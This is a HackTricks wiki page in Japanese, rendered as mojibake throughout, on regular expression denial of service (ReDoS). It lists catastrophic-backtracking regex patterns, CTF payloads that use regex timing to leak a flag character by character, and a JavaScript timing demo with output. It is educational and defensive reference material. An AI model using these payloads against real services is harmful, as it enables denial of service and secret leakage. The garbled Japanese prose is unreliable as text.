# æ­£è¦è¡¨ç¾ã‚µãƒ¼ãƒ“ã‚¹æ‹’å¦æ”»æ’ƒ - ReDoS

{% hint style="success" %}
AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCPãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹</summary>

* [**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼
* **ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**Telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„ã€‚**
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€[**HackTricks**](https://github.com/carlospolop/hacktricks)ãŠã‚ˆã³[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>
{% endhint %}

# æ­£è¦è¡¨ç¾ã‚µãƒ¼ãƒ“ã‚¹æ‹’å¦æ”»æ’ƒ (ReDoS)

**æ­£è¦è¡¨ç¾ã‚µãƒ¼ãƒ“ã‚¹æ‹’å¦æ”»æ’ƒ (ReDoS)** ã¯ã€èª°ã‹ãŒæ­£è¦è¡¨ç¾ï¼ˆãƒ†ã‚­ã‚¹ãƒˆå†…ã®ãƒ‘ã‚¿ãƒ¼ãƒ³ã‚’æ¤œç´¢ã—ä¸€è‡´ã•ã›ã‚‹æ–¹æ³•ï¼‰ã®å‹•ä½œã®å¼±ç‚¹ã‚’åˆ©ç”¨ã™ã‚‹ã“ã¨ã§ç™ºç”Ÿã—ã¾ã™ã€‚æ­£è¦è¡¨ç¾ãŒä½¿ç”¨ã•ã‚Œã‚‹ã¨ã€ç‰¹ã«å‡¦ç†ã™ã‚‹ãƒ†ã‚­ã‚¹ãƒˆãŒå¤§ãããªã‚‹ã¨ã€éå¸¸ã«é…ããªã‚‹ã“ã¨ãŒã‚ã‚Šã¾ã™ã€‚ã“ã®é…ã•ã¯ã€ãƒ†ã‚­ã‚¹ãƒˆã‚µã‚¤ã‚ºãŒã‚ãšã‹ã«å¢—åŠ ã™ã‚‹ã ã‘ã§æ€¥é€Ÿã«æ‚ªåŒ–ã™ã‚‹ã“ã¨ãŒã‚ã‚Šã¾ã™ã€‚æ”»æ’ƒè€…ã¯ã“ã®å•é¡Œã‚’åˆ©ç”¨ã—ã¦ã€æ­£è¦è¡¨ç¾ã‚’ä½¿ç”¨ã™ã‚‹ãƒ—ãƒ­ã‚°ãƒ©ãƒ ãŒé•·æ™‚é–“æ­£å¸¸ã«å‹•ä½œã—ãªã„ã‚ˆã†ã«ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

## å•é¡Œã®ã‚ã‚‹RegexãƒŠã‚¤ãƒ¼ãƒ–ã‚¢ãƒ«ã‚´ãƒªã‚ºãƒ 

**è©³ç´°ã¯[https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS](https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS)ã‚’ç¢ºèªã—ã¦ãã ã•ã„ã€‚**

## æ‚ªæ„ã®ã‚ã‚‹Regex <a href="#evil-regexes" id="evil-regexes"></a>

æ‚ªæ„ã®ã‚ã‚‹æ­£è¦è¡¨ç¾ãƒ‘ã‚¿ãƒ¼ãƒ³ã¨ã¯ã€**ä½œæˆã•ã‚ŒãŸå…¥åŠ›ã«å¼•ã£ã‹ã‹ã‚Šã€DoSã‚’å¼•ãèµ·ã“ã™**ã“ã¨ãŒã§ãã‚‹ã‚‚ã®ã§ã™ã€‚æ‚ªæ„ã®ã‚ã‚‹æ­£è¦è¡¨ç¾ãƒ‘ã‚¿ãƒ¼ãƒ³ã¯ã€é€šå¸¸ã€ç¹°ã‚Šè¿”ã—ã‚’ä¼´ã†ã‚°ãƒ«ãƒ¼ãƒ—åŒ–ã‚„ã€ç¹°ã‚Šè¿”ã—ã¾ãŸã¯é‡è¤‡ã‚’å«ã‚€é¸æŠè‚¢ã‚’å«ã‚“ã§ã„ã¾ã™ã€‚æ‚ªæ„ã®ã‚ã‚‹ãƒ‘ã‚¿ãƒ¼ãƒ³ã®ã„ãã¤ã‹ã®ä¾‹ã¯æ¬¡ã®ã¨ãŠã‚Šã§ã™ï¼š

* (a+)+
* ([a-zA-Z]+)*
* (a|aa)+
* (a|a?)+
* (.*a){x} for x > 10

ã“ã‚Œã‚‰ã¯ã™ã¹ã¦ã€å…¥åŠ› `aaaaaaaaaaaaaaaaaaaaaaaa!` ã«å¯¾ã—ã¦è„†å¼±ã§ã™ã€‚

## ReDoSãƒšã‚¤ãƒ­ãƒ¼ãƒ‰

### ReDoSã«ã‚ˆã‚‹æ–‡å­—åˆ—ã®æµå‡º

CTFï¼ˆã¾ãŸã¯ãƒã‚°ãƒã‚¦ãƒ³ãƒ†ã‚£ï¼‰ã§ã¯ã€**æ­£è¦è¡¨ç¾ãŒä¸€è‡´ã™ã‚‹æ©Ÿå¯†æƒ…å ±ï¼ˆãƒ•ãƒ©ã‚°ï¼‰ã‚’åˆ¶å¾¡ã—ã¦ã„ã‚‹**ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚ãã®å ´åˆã€**æ­£è¦è¡¨ç¾ãŒä¸€è‡´ã—ãŸå ´åˆã«ãƒšãƒ¼ã‚¸ã‚’ãƒ•ãƒªãƒ¼ã‚ºï¼ˆã‚¿ã‚¤ãƒ ã‚¢ã‚¦ãƒˆã¾ãŸã¯é•·ã„å‡¦ç†æ™‚é–“ï¼‰ã•ã›ã‚‹**ã“ã¨ãŒæœ‰ç”¨ã§ã™ã€‚ãã†ã™ã‚‹ã“ã¨ã§ã€**æ–‡å­—åˆ—ã‚’1æ–‡å­—ãšã¤æµå‡ºã•ã›ã‚‹**ã“ã¨ãŒã§ãã¾ã™ï¼š

* [**ã“ã®æŠ•ç¨¿**](https://portswigger.net/daily-swig/blind-regex-injection-theoretical-exploit-offers-new-way-to-force-web-apps-to-spill-secrets)ã§ã¯ã€ã“ã®ReDoSãƒ«ãƒ¼ãƒ«ã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼š`^(?=<flag>)((.*)*)*salt$`
* ä¾‹ï¼š`^(?=HTB{sOmE_flÂ§NÂ§)((.*)*)*salt$`
* [**ã“ã®è§£èª¬**](https://github.com/jorgectf/Created-CTF-Challenges/blob/main/challenges/TacoMaker%20%40%20DEKRA%20CTF%202022/solver/solver.html)ã§ã¯ã€æ¬¡ã®ã‚‚ã®ãŒè¦‹ã¤ã‹ã‚Šã¾ã™ï¼š`<flag>(((((((.*)*)*)*)*)*)*)!`
* [**ã“ã®è§£èª¬**](https://ctftime.org/writeup/25869)ã§ã¯ã€æ¬¡ã®ã‚‚ã®ãŒä½¿ç”¨ã•ã‚Œã¾ã—ãŸï¼š`^(?=${flag_prefix}).*.*.*.*.*.*.*.*!!!!$`

### ReDoSã®å…¥åŠ›ã¨æ­£è¦è¡¨ç¾ã®åˆ¶å¾¡

ä»¥ä¸‹ã¯ã€**å…¥åŠ›**ã¨**æ­£è¦è¡¨ç¾**ã®ä¸¡æ–¹ã‚’**åˆ¶å¾¡**ã™ã‚‹**ReDoS**ã®ä¾‹ã§ã™ï¼š
```javascript
function check_time_regexp(regexp, text){
var t0 = new Date().getTime();;
new RegExp(regexp).test(text);
var t1 = new Date().getTime();;
console.log("Regexp " + regexp + " took " + (t1 - t0) + " milliseconds.")
}

// This payloads work because the input has several "a"s
[
//  "((a+)+)+$",  //Eternal,
//  "(a?){100}$", //Eternal
"(a|a?)+$",
"(\\w*)+$",   //Generic
"(a*)+$",
"(.*a){100}$",
"([a-zA-Z]+)*$", //Generic
"(a+)*$",
].forEach(regexp => check_time_regexp(regexp, "aaaaaaaaaaaaaaaaaaaaaaaaaa!"))

/*
Regexp (a|a?)+$ took 5076 milliseconds.
Regexp (\w*)+$ took 3198 milliseconds.
Regexp (a*)+$ took 3281 milliseconds.
Regexp (.*a){100}$ took 1436 milliseconds.
Regexp ([a-zA-Z]+)*$ took 773 milliseconds.
Regexp (a+)*$ took 723 milliseconds.
*/
```
## ãƒ„ãƒ¼ãƒ«

* [https://github.com/doyensec/regexploit](https://github.com/doyensec/regexploit)
* [https://devina.io/redos-checker](https://devina.io/redos-checker)

## å‚è€ƒæ–‡çŒ®
* [https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS](https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS)
* [https://portswigger.net/daily-swig/blind-regex-injection-theoretical-exploit-offers-new-way-to-force-web-apps-to-spill-secrets](https://portswigger.net/daily-swig/blind-regex-injection-theoretical-exploit-offers-new-way-to-force-web-apps-to-spill-secrets)
* [https://github.com/jorgectf/Created-CTF-Challenges/blob/main/challenges/TacoMaker%20%40%20DEKRA%20CTF%202022/solver/solver.html](https://github.com/jorgectf/Created-CTF-Challenges/blob/main/challenges/TacoMaker%20%40%20DEKRA%20CTF%202022/solver/solver.html)
* [https://ctftime.org/writeup/25869](https://ctftime.org/writeup/25869)

{% hint style="success" %}
AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€ç·´ç¿’ã™ã‚‹ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCPãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€ç·´ç¿’ã™ã‚‹ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹</summary>

* [**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼
* **ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**ãƒ†ãƒ¬ã‚°ãƒ©ãƒ ã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„ã€‚**
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€[**HackTricks**](https://github.com/carlospolop/hacktricks)ãŠã‚ˆã³[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>
{% endhint %}
